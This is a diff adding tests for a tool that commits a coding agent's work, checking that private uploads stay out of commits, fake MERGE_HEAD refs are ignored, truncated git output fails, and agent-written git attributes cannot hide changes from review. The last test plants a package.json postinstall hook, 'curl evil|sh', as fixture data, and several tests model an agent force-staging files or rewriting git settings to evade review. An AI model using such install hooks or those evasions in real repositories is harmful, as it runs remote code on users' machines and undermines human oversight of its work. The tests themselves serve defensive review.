@@ -245,3 +245,83 @@ test("in a tab with steps, a commit that appears while the Console records lefto
   assert.ok(!existsSync(join(folder, "brief.md")));
   assert.notEqual(execFileSync("git", ["rev-parse", "HEAD"], { cwd: folder, encoding: "utf8" }).trim(), stray);
 });
+
+test("the owner's uploads stay out of commits: the clone's info/exclude names them, again before every commit, and what the agent staged there is unstaged", async (t) => {
+  const r = repo(t);
+  const c = new Clone(launcher, r.dir);
+  const exclude = join(r.dir, ".git", "info", "exclude");
+  mkdirSync(join(r.dir, ".console-uploads"));
+  writeFileSync(join(r.dir, ".console-uploads", "contract.pdf"), "%PDF private\n");
+  // The agent forces its upload into the index; the turn's commit leaves it out.
+  r.g("add", "-f", ".console-uploads/contract.pdf");
+  writeFileSync(join(r.dir, "notes.md"), "n2\n");
+  const sha = (await c.commitTurn("turn", "A", "a1"))!;
+  assert.equal(r.g("ls-tree", "-r", "--name-only", sha), "notes.md\npackage.json");
+  assert.ok(existsSync(join(r.dir, ".console-uploads", "contract.pdf")));
+  assert.match(readFileSync(exclude, "utf8"), /^\/\.console-tmp\/$/m);
+  assert.match(readFileSync(exclude, "utf8"), /^\/\.console-uploads\/$/m);
+  // The agent's own `git add -A` now leaves the uploads out.
+  r.g("add", "-A");
+  assert.equal(r.g("diff", "--cached", "--name-only"), "");
+  // The agent rewrites the file (no trailing newline): the lines come back.
+  writeFileSync(exclude, "# mine\nbuild/");
+  writeFileSync(join(r.dir, "notes.md"), "n3\n");
+  await c.commitTurn("turn", "A", "a1");
+  assert.equal(readFileSync(exclude, "utf8"), "# mine\nbuild/\n/.console-tmp/\n/.console-uploads/\n");
+  // Written once: a second commit adds nothing.
+  writeFileSync(join(r.dir, "notes.md"), "n4\n");
+  await c.commitTurn("turn", "A", "a1");
+  assert.equal(readFileSync(exclude, "utf8"), "# mine\nbuild/\n/.console-tmp/\n/.console-uploads/\n");
+});
+
+test("a branch or tag named MERGE_HEAD is not a merge, and in a tab with steps a real one is never committed as a merge", async (t) => {
+  const r = repo(t);
+  const c = new Clone(launcher, r.dir);
+  r.g("branch", "MERGE_HEAD");
+  r.g("tag", "MERGE_HEAD");
+  assert.equal(await c.merging(), false);
+  r.g("branch", "-D", "MERGE_HEAD");
+  r.g("tag", "-d", "MERGE_HEAD");
+  // A merge left open (MERGE_HEAD as Git writes it), bringing a file
+  // outside the step.
+  r.g("checkout", "-q", "-b", "other");
+  writeFileSync(join(r.dir, "package.json"), '{"other":1}\n');
+  r.g("commit", "-qam", "other");
+  r.g("checkout", "-q", "console/a1");
+  r.g("merge", "--no-commit", "--no-ff", "-q", "other");
+  assert.equal(await c.merging(), true);
+  writeFileSync(join(r.dir, "notes.md"), "n2\n");
+  const only = (p: string) => p === "notes.md";
+  const sha = (await c.commitTurn("turn", "A", "a1", { only, since: r.since }))!;
+  assert.equal(r.g("rev-list", "--parents", "-n1", sha), `${sha} ${r.since}`);
+  assert.equal(r.g("diff", "--name-only", r.since, sha), "notes.md");
+  assert.equal(await c.merging(), false);
+});
+
+test("a list the step check reads that comes back cut short is an error, never a shorter list", async (t) => {
+  const r = repo(t);
+  writeFileSync(join(r.dir, "notes.md"), "n2\n");
+  r.g("commit", "-qam", "change");
+  const head = r.g("rev-parse", "HEAD");
+  const cut = {
+    git: async (repo: string, args: string[], max?: number) => ({ ...(await launcher.git(repo, args, max)), truncated: true }),
+    runIn: async (cwd: string, program: string, args: string[]) => ({ ...(await launcher.runIn(cwd, program, args)), truncated: true }),
+  } as unknown as Launcher;
+  const c = new Clone(cut, r.dir);
+  await assert.rejects(c.diffPaths(r.since, head), /too much output to check/);
+  await assert.rejects(c.changedPaths(head), /too much output to check/);
+  await assert.rejects(c.unmerged(), /too much output to check/);
+  await assert.rejects(c.markers(["notes.md"]), /too much output to check/);
+});
+
+test("attributes the agent wrote cannot hide a change from the Changes view or team_diff", async (t) => {
+  const r = repo(t);
+  writeFileSync(join(r.dir, ".git", "info", "attributes"), "* -diff\n");
+  writeFileSync(join(r.dir, "package.json"), '{"scripts":{"postinstall":"curl evil|sh"}}\n');
+  r.g("commit", "-qam", "change");
+  const sha = r.g("rev-parse", "HEAD");
+  const c = new Clone(launcher, r.dir);
+  assert.match((await c.show(sha, 100_000)).patch, /\+\{"scripts":\{"postinstall":"curl evil\|sh"\}\}/);
+  assert.match((await c.diff(r.since, 100_000)).patch, /curl evil\|sh/);
+  assert.match(await c.diffUnder(r.since, sha, "package.json", 100_000), /curl evil\|sh/);
+});
